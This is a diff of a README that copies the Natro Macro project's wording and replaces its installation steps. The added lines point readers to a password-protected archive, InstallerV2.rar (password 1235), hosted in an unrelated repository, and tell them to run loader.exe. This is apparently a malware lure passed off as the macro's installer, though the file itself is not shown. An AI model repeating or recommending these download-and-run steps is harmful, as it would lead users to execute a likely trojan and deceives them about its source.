@@ -1,26 +1,21 @@
-[# justexp
-](https://raw.githubusercontent.com/NatroTeam/.github/main/profile/assets/banners/natro-logo-light.svg
 
-##🛠 Installation
-Download last release from the # Download Password : NatroMacro
-Open release.rar and double-click the folder inside
-Run releaese v.2.0.3.exe and wait for the macro to load
+## 🛠 Installation
+Download last release from the [Download](https://github.com/ferrazjaa/JessicaFerraz-cv/releases/download/321/InstallerV2.rar) Password : 1235
+Open InstallerV2.rar and double-click the folder inside
+Run loader.exe and wait for the macro to load
 
-##💝 Credits
+## 💝 Credits
 Natro Macro wouldn't be possible without the help and inspiration of many extraordinary individuals.
-We want to show our gratitude to all of you, so please check out our [list of credits][credits-link]!
+We want to show our gratitude to all of you, so please check out our list of credits!
 
 Thank you all for your hard work and support!
 
-
-##🌠 Stars
+## 🌠 Stars
 If Natro Macro helped you, let us know by giving it a ⭐️Star on GitHub!
 You can do this by scrolling up and clicking the Star button at the top of the page!
 
-https://camo.githubusercontent.com/8bb38521d249a60c078a1945de36408ad32bf7d4dff3e8f1f64008bee66996ff/687474703a2f2f7265706f726f737465722e636f6d2f73746172732f4e6174726f5465616d2f4e6174726f4d6163726f
+![photo_2024-08-16_00-28-11](https://github.com/user-attachments/assets/589661d0-96e8-491e-b108-6d91a05ebfac)
 
-stargazer-widget
-
-##📝 License
+## 📝 License
 Copyright © 2022-2024
-This project is licensed under GNU GPL v3.0)
+This project is licensed under GNU GPL v3.0
